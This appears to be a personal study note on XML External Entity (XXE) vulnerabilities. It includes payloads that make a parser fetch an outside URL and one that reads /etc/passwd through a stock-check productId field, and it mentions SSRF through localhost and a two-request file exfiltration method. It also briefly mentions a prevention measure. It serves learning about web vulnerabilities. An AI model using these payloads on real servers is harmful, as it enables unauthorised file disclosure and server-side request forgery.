Visit [[XML]] to learn more about XML

This vulnerability comes from External XML Entity that accepts `SYSTEM` operand

Simple Example
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE note [<!ENTITY entity-name SYSTEM "URI/URL">]>  
<note>  
<to>Tove</to>  
<from>Jani</from>  
<heading>Reminder</heading>  
<body>Don't forget me this weekend!</body>  
</note>
```

Now, lets put actual values inside placeholders
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE note [<!ENTITY writer SYSTEM "http://x.com/">]>  
<note>  
<to>Tove</to>  
<from>Jani</from>  
<heading>Reminder</heading>  
<body>Don't forget me this weekend!</body>  
</note>
```

As a result, XML parser would send a HTTP GET request to the specified URL

To prevent this vulnerability, the web server(s) should not be able to go make a request outside the DMZ. Look at [[Modern Web Workflow]] to understand

#### XML in POST request
Reading contents of `/etc/passwd` file using a XML as a body for POST request.
Here wrong `productId` returns an error with contents of `productId`. Therefore, we can read the given file.
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE note [<!ENTITY writer SYSTEM "file:///etc/passwd">]>  
<stockCheck>  
	<productId>&writer;</productId>
	<storeId>1</storeId>
</stockCheck>
```

> [!info] Causing SSRF through XXE
> You can also cause [[Security/Web/Vulnerabilities/Server Side Vulnerabilities/SSRF]] by writing localhost after `SYSTEM` operand

---
#### Reading an XML file using XXE
You can't just read XML files with previous methods, as the XML parser breaks and does not count another XML file as proper data

So you do a simple GET request to read the content of the xml file, and after it comes back, you send another GET request with the content of the XML file as parameter for the GET request

---
## Related links

Check out this [video](https://www.youtube.com/watch?v=-BPnSQou8yw) by mdisec to learn more about XXE